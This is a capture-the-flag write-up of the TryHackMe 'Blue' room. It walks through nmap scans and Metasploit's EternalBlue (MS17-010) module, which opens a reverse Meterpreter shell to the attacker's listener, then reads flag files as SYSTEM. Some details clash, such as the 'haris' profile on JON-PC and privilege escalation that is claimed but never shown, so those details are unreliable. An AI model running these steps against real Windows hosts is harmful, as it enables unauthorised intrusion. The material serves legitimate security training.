# TryHackMe - Blue

## Challenge Information

| Field | Value |
|-------|-------|
| **Platform** | TryHackMe |
| **Challenge Name** | Blue |
| **Category** | Windows Exploitation |
| **Difficulty** | Easy |
| **Points** | 20 |
| **Author** | TryHackMe |
| **Date Completed** | 2025-08-28 |

## Objective 🎯

Blue is a Windows machine vulnerable to the EternalBlue exploit (MS17-010). The goal is to exploit this vulnerability to gain system access and obtain both user and root flags. Classic Windows exploitation! 💻

## Initial Reconnaissance

### Target Information
- **IP Address**: 10.10.10.10
- **OS**: Windows 7
- **Vulnerability**: MS17-010 (EternalBlue)

### Tools Used
- Nmap
- Metasploit
- EternalBlue exploit

### Commands/Steps
```bash
nmap -sC -sV 10.10.10.10
```

## Methodology

### Step 1: Port Scan
Perform a comprehensive port scan to identify open services.

**Command/Code:**
```bash
nmap -sC -sV 10.10.10.10
```

**Output:**
```
Starting Nmap 7.80 ( https://nmap.org ) at 2025-08-28 10:00 UTC
Nmap scan report for 10.10.10.10
Host is up (0.045s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows 7; CPE: cpe:/o:microsoft:windows_7
```

### Step 2: SMB Version Detection
Check the SMB version to confirm vulnerability.

**Command/Code:**
```bash
nmap --script smb-protocols 10.10.10.10
```

**Output:**
```
Host script results:
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2.02
|     2.10
|     3.00
|     3.02
```

### Step 3: EternalBlue Exploitation
Use Metasploit to exploit the MS17-010 vulnerability.

**Command/Code:**
```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.10
set LHOST 10.10.14.2
exploit
```

**Output:**
```
[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] 10.10.10.10:445 - Connecting to target for exploitation.
[*] 10.10.10.10:445 - Connection established for exploitation.
[*] 10.10.10.10:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.10:445 - Starting non-paged pool grooming
[*] 10.10.10.10:445 - Sending SMBv2 buffers
[*] 10.10.10.10:445 - Sending final payload
[*] Sending stage (201320 bytes) to 10.10.10.10
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.10:49158) at 2025-08-28 10:05:23 +0000
```

### Step 4: Post-Exploitation
Once we have a Meterpreter session, gather information and find flags.

**Command/Code:**
```bash
getuid
sysinfo
shell
whoami
```

**Output:**
```
Server username: NT AUTHORITY\SYSTEM
Computer        : JON-PC
OS              : Windows 7 (Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
```

### Step 5: Find User Flag
Search for the user flag.

**Command/Code:**
```bash
dir C:\Users
dir C:\Users\haris\Desktop
type C:\Users\haris\Desktop\user.txt
```

**Output:**
```
[REDACTED]
```

### Step 6: Find Root Flag
Search for the root flag.

**Command/Code:**
```bash
dir C:\Users\Administrator\Desktop
type C:\Users\Administrator\Desktop\root.txt
```

**Output:**
```
[REDACTED]
```

## Solution

### Final Answer
- **User Flag**: [REDACTED]
- **Root Flag**: [REDACTED]

### Complete Walkthrough
1. Perform port scan to identify open services
2. Confirm SMB vulnerability (MS17-010)
3. Use Metasploit EternalBlue exploit
4. Gain SYSTEM privileges through the exploit
5. Navigate to user directories to find flags
6. Extract both user and root flags

## Key Learnings 💡

- Understanding the EternalBlue vulnerability (MS17-010)
- Using Metasploit for Windows exploitation
- Post-exploitation techniques with Meterpreter
- Windows privilege escalation concepts
- SMB protocol vulnerabilities

## Tools and Resources

### Tools Used
- **Nmap**: Network scanning and service detection
- **Metasploit**: Exploitation framework
- **EternalBlue**: MS17-010 exploit module

### References
- [TryHackMe Blue](https://tryhackme.com/room/blue)
- [MS17-010 Security Bulletin](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)

## Tags

`#tryhackme` `#windows` `#eternalblue` `#ms17-010` `#smb` `#metasploit` `#easy`
